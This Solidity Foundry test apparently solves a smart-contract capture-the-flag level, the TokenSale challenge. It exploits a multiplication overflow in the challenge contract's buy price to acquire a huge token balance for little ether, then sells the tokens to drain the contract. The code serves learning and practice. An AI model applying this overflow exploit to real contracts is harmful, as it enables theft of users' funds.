// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.14;

import "forge-std/Test.sol";
import "../src/math/TokenSale.sol";
import "forge-std/console.sol";

// forge test --match-contract TokenSaleTest -vvvv
contract TokenSaleTest is Test {
    address player = address(100);

    function setUp() public {
        vm.deal(player, 5 ether);
    }

    function testTokenSaleHack() public {
        /****************
         * Factory setup *
         *************** */
        TokenSaleChallenge tokenSale = new TokenSaleChallenge{value: 1 ether}();
        vm.startPrank(player);
        address levelAddress = address(tokenSale);
        uint256 initialPlayerBalance = player.balance;
        assertEq(initialPlayerBalance, 5 ether);
        /****************
         *    Attack     *
         *************** */
        /*
         * We can absolute overflow here
         */
        uint256 withdrawn;
        uint256 hackedBalance;
        unchecked {
            uint256 maxUint = type(uint256).max;
            uint256 overflowed = (maxUint / 1e18) + 1;
            tokenSale.buy{value: overflowed * 1e18}(overflowed);

            hackedBalance = address(tokenSale).balance;

            tokenSale.sell(hackedBalance / 1 ether);
            withdrawn = address(tokenSale).balance;
        }
        /*****************
         *Level Submission*
         ***************  */
        bool levelSuccessfullyPassed = tokenSale.isComplete();
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
